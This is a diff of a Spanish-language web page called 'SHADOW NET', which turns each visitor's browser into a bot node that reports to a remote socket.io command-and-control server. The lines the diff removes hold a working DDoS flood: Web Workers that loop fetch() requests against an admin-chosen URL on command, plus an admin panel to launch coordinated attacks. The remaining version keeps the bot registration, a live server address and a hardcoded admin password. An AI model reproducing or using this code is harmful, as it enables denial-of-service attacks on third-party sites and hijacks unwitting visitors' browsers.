@@ -3,29 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SHADOW NET v4.0 - CENTRAL CORE</title>
+    <title>SHADOW NET v4.1 - CENTRAL CORE</title>
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     
     <style>
         :root { 
             --neon-green: #0f0; --neon-pink: #ff00ff; --neon-red: #f00; --neon-blue: #0cf;
-            --dark-bg: #050505; --panel-bg: #0d0d0d; --glass: rgba(255, 255, 255, 0.03);
+            --dark-bg: #050505; --panel-bg: #0d0d0d;
         }
         body { 
-            background: var(--dark-bg); color: var(--neon-green); font-family: 'Segoe UI', 'Courier New', monospace; 
-            text-align: center; margin: 0; overflow-x: hidden;
-            background-image: radial-gradient(circle at center, #001a00 0%, #050505 100%);
+            background: var(--dark-bg); color: var(--neon-green); font-family: 'Segoe UI', monospace; 
+            text-align: center; margin: 0; background-image: radial-gradient(circle at center, #001a00 0%, #050505 100%);
         }
         .header-system { 
             background: rgba(0,0,0,0.8); padding: 12px; border-bottom: 1px solid var(--neon-blue); 
             font-size: 11px; display: flex; justify-content: space-around; color: var(--neon-blue);
-            letter-spacing: 2px; text-shadow: 0 0 5px var(--neon-blue);
         }
         .radar-container { position: relative; width: 160px; height: 160px; margin: 30px auto; }
         .radar { 
             border: 1px solid rgba(0, 255, 0, 0.3); border-radius: 50%; width: 100%; height: 100%; 
             position: relative; background: repeating-radial-gradient(circle, #000 0%, #000 10%, #010 11%);
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.1);
         }
         .radar::after { 
             content: ''; position: absolute; width: 50%; height: 2px; 
@@ -33,52 +30,30 @@
             left: 50%; top: 50%; transform-origin: left; animation: scan 3s linear infinite; 
         }
         .nodes-count { font-size: 80px; color: var(--neon-pink); text-shadow: 0 0 30px var(--neon-pink); margin: 0; font-weight: 900; }
-        .label-nodes { font-size: 12px; color: #888; text-transform: uppercase; margin-bottom: 20px; letter-spacing: 3px; }
+        .label-nodes { font-size: 12px; color: #888; text-transform: uppercase; letter-spacing: 3px; }
         
         .c2-wrapper { 
             display: none; background: var(--panel-bg); border: 1px solid var(--neon-blue); 
-            margin: 20px auto; width: 95%; max-width: 900px; border-radius: 4px; 
-            box-shadow: 0 0 50px rgba(0, 0, 0, 1); overflow: hidden; animation: fadeIn 0.5s ease;
+            margin: 20px auto; width: 95%; max-width: 900px; border-radius: 4px; padding: 20px;
         }
-        .c2-header { background: var(--neon-blue); color: #000; padding: 8px 15px; font-size: 12px; font-weight: bold; display: flex; justify-content: space-between; text-transform: uppercase; }
-        .c2-content { padding: 20px; display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
-        .control-group { background: rgba(255,255,255,0.02); border: 1px solid #222; padding: 15px; border-radius: 4px; text-align: left; }
-        .control-group label { font-size: 10px; color: var(--neon-blue); display: block; margin-bottom: 8px; font-weight: bold; }
-        .stat-value { font-size: 22px; color: #fff; font-family: 'Courier New'; font-weight: bold; text-shadow: 0 0 10px var(--neon-blue); }
-
-        input, button { width: 100%; padding: 12px; background: #000; border: 1px solid #333; color: var(--neon-green); font-family: 'Courier New'; font-size: 13px; box-sizing: border-box; }
-        .btn-main { background: #002200; cursor: pointer; border: 1px solid var(--neon-green); text-transform: uppercase; letter-spacing: 2px; }
-        .btn-main:hover { background: var(--neon-green); color: #000; }
-        .btn-danger { grid-column: span 2; background: #220000; border: 1px solid var(--neon-red); color: var(--neon-red); font-weight: bold; cursor: pointer; }
-
-        #soldier-monitor, #chat-box, #console-log, #chat-box-public { height: 120px; background: #000; border: 1px solid #1a1a1a; padding: 10px; font-size: 11px; overflow-y: auto; text-align: left; }
-        #soldier-monitor { border-top: 2px solid var(--neon-pink); color: var(--neon-pink); }
-        #console-log { border-top: 2px solid var(--neon-green); color: var(--neon-green); }
-        #chat-box, #chat-box-public { border-top: 2px solid var(--neon-blue); color: #fff; grid-column: span 2; height: 180px; }
-        .chat-input-container { grid-column: span 2; display: flex; gap: 10px; }
+        input, button { width: 100%; padding: 12px; background: #000; border: 1px solid #333; color: var(--neon-green); margin-bottom: 10px; }
+        #soldier-monitor { height: 120px; background: #000; border: 1px solid #1a1a1a; padding: 10px; font-size: 11px; overflow-y: auto; text-align: left; color: var(--neon-pink); }
 
         @keyframes scan { from { transform: rotate(0deg) translate(-50%, -50%); } to { transform: rotate(360deg) translate(-50%, -50%); } }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
 
     <div class="header-system">
-        <span>&bull; SHADOW_NET_v4.0 [OPTIMIZADO 10K]</span>
+        <span>&bull; SHADOW_NET_v4.1 [STABLE]</span>
         <span id="my-id-display">&bull; CONECTANDO...</span>
-        <span id="total-hits" style="color: var(--neon-pink);">VISITAS: 0</span>
     </div>
 
     <div class="radar-container"><div class="radar"></div></div>
     <div class="nodes-count" id="count">0</div>
     <div class="label-nodes">Nodos Esclavos en Línea</div>
 
-    <div id="view-public">
-        <div id="chat-box-public" style="width: 90%; max-width: 800px; margin: 10px auto;"></div>
-        <div class="chat-input-container" style="width: 90%; max-width: 800px; margin: 15px auto;">
-            <input type="text" id="chat-msg-public" placeholder="Mensaje al enjambre...">
-            <button onclick="sendChatMessage(false)" style="width: 120px;">ENVIAR</button>
-        </div>
+    <div id="view-public" style="width: 90%; max-width: 800px; margin: auto;">
         <div style="margin-top: 40px; padding-bottom: 50px;">
             <input type="password" id="access-key" placeholder="ROOT KEY" style="width:140px; text-align:center;">
             <button onclick="authAdmin()" style="width:140px; border-color: var(--neon-red); color: var(--neon-red);">LOGIN</button>
@@ -86,130 +61,38 @@
     </div>
 
     <div id="view-internal" class="c2-wrapper">
-        <div class="c2-header">
-            <span>&gt; MANDO CENTRAL - SHADOW NET</span>
-            <span id="clock">00:00:00</span>
-        </div>
-        
-        <div class="c2-content">
-            <div class="control-group">
-                <label>PAQUETES TOTALES (RED)</label>
-                <div id="packet-counter" class="stat-value">0</div>
-            </div>
-            <div class="control-group">
-                <label>STATUS</label>
-                <div id="status-display" class="stat-value">STANDBY</div>
-            </div>
-
-            <div class="control-group">
-                <label>OBJETIVO (URL)</label>
-                <input type="text" id="dest-path" placeholder="https://ejemplo.com">
-            </div>
-            <div class="control-group">
-                <label>HILOS (MAX 300)</label>
-                <input type="number" id="thread-count" value="100">
-            </div>
-
-            <div id="soldier-monitor">>> ESCANEANDO NODOS...</div>
-            <div id="console-log">>> Sistema cargado. Listo en 4everland.</div>
-
-            <div id="chat-box"></div>
-            <div class="chat-input-container">
-                <input type="text" id="chat-msg-admin" placeholder="ORDEN MAESTRA...">
-                <button onclick="sendChatMessage(true)" style="width: 140px; color: var(--neon-red);">EMITIR</button>
-            </div>
-
-            <button class="btn-main" onclick="initializeSystem()">INICIAR ATAQUE COORDINADO</button>
-            <button class="btn-danger" onclick="stopSystem()">DETENER TODO</button>
-        </div>
+        <div style="color:var(--neon-blue); margin-bottom:15px;">&gt; PANEL DE CONTROL CENTRAL</div>
+        <div id="soldier-monitor">>> ESCANEANDO NODOS...</div>
+        <button onclick="location.reload()" style="margin-top:15px;">REFRESCAR CONEXIÓN</button>
     </div>
 
     <script>
-        // CONEXIÓN AL SERVIDOR V41
+        // 1. CONEXIÓN AL SERVIDOR (Asegúrate que el link sea este)
         const socket = io("https://shadow-net-v41.onrender.com");
-        let _0xworkers = [];
-        let _0xps = 0;
         
-        // NOMBRE DE VARIABLE CORREGIDO (Sin número al inicio)
-        let nid = "BOT" + Math.floor(Math.random() * 9999);
+        // 2. IDENTIFICACIÓN (Variable corregida)
+        let nid = "BOT-" + Math.floor(Math.random() * 9999);
         document.getElementById("my-id-display").innerText = "• SESIÓN: " + nid;
 
-        socket.emit('node_entry', { id: nid });
+        // Avisar al servidor que entramos
+        socket.on('connect', () => {
+            console.log("Conectado al servidor!");
+            socket.emit('node_entry', { id: nid });
+        });
 
-        const workerCode = `
-            let active = false;
-            self.onmessage = async (e) => {
-                const { url, threads, active: status } = e.data;
-                active = status;
-                if (!active) return;
-                while (active) {
-                    const tasks = [];
-                    for (let i = 0; i < threads; i++) {
-                        tasks.push(fetch(url, { mode: 'no-cors', cache: 'no-cache' }).catch(() => {}));
-                    }
-                    await Promise.allSettled(tasks);
-                    self.postMessage({ sent: threads });
-                }
-            };
-        `;
-        const blob = new Blob([workerCode], { type: 'application/javascript' });
-        const workerURL = URL.createObjectURL(blob);
-
+        // 3. RECIBIR ACTUALIZACIÓN (Esto cambia el 0 por el 1)
         socket.on('update_network', (d) => {
+            console.log("Datos recibidos:", d);
             document.getElementById('count').innerText = d.total;
+            
             let l = "";
             if(d.nodes) {
-                d.nodes.slice(-15).forEach(n => {
-                    // COMILLAS INCLINADAS CORREGIDAS
-                    l += \<div>[+] \${n} <span style="color:var(--neon-green); float:right;">ONLINE</span></div>\;
+                d.nodes.slice(-10).forEach(n => {
+                    l += <div>[+] ${n} <span style="color:var(--neon-green); float:right;">ONLINE</span></div>;
                 });
             }
             document.getElementById('soldier-monitor').innerHTML = l;
         });
-
-        socket.on('stats_update', (d) => {
-            if(d.packets) document.getElementById('packet-counter').innerText = d.packets.toLocaleString();
-        });
-
-        socket.on('receive_chat', (d) => {
-            let c = d.user.includes("ADMIN") ? "var(--neon-red)" : "var(--neon-blue)";
-            let h = \<div><span style="color:#444; font-size:9px;">[\${d.time}]</span> <span style="color:\${c}; font-weight:bold;">\${d.user}:</span> \${d.msg}</div>\;
-            ['chat-box-public', 'chat-box'].forEach(id => {
-                const el = document.getElementById(id);
-                if(el) { el.innerHTML += h; el.scrollTop = el.scrollHeight; }
-            });
-        });
-
-        socket.on('task_broadcast', (t) => {
-            if (t.active) {
-                document.getElementById('status-display').innerText = "ATACANDO";
-                startHeavyAttack(t.dest, t.hilos);
-            } else {
-                stopHeavyAttack();
-                document.getElementById('status-display').innerText = "STANDBY";
-            }
-        });
-
-        function startHeavyAttack(url, threads) {
-            stopHeavyAttack();
-            for (let i = 0; i < 4; i++) {
-                const w = new Worker(workerURL);
-                w.onmessage = (e) => {
-                    _0xps += e.data.sent;
-                    if (_0xps >= 5000) { 
-                        socket.emit('report_packets', { count: _0xps });
-                        _0xps = 0;
-                    }
-                };
-                w.postMessage({ url, threads: Math.floor(threads/4), active: true });
-                _0xworkers.push(w);
-            }
-        }
-
-        function stopHeavyAttack() {
-            _0xworkers.forEach(w => w.terminate());
-            _0xworkers = [];
-        }
 
         function authAdmin() {
             const k = "killerbean"; 
@@ -219,33 +102,6 @@
                 document.getElementById('view-public').style.display = 'none';
             } else { alert("ACCESO DENEGADO"); }
         }
-
-        function initializeSystem() {
-            const u = document.getElementById('dest-path').value;
-            let h = parseInt(document.getElementById('thread-count').value);
-            if (h > 300) h = 300;
-            if(!u) return alert("ERROR: Ingrese objetivo");
-            socket.emit('new_task', { dest: u, active: true, hilos: h });
-        }
-
-        function stopSystem() { socket.emit('new_task', { active: false }); }
-
-        function sendChatMessage(a) {
-            const i = a ? document.getElementById('chat-msg-admin') : document.getElementById('chat-msg-public');
-            if (i.value.trim()) {
-                socket.emit('send_chat', {
-                    user: a ? "ADMIN_CENTRAL" : nid,
-                    msg: i.value,
-                    time: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})
-                });
-                i.value = "";
-            }
-        }
-
-        setInterval(() => { 
-            const c = document.getElementById('clock');
-            if(c) c.innerText = new Date().toLocaleTimeString(); 
-        }, 1000);
     </script>
 </body>
 </html>
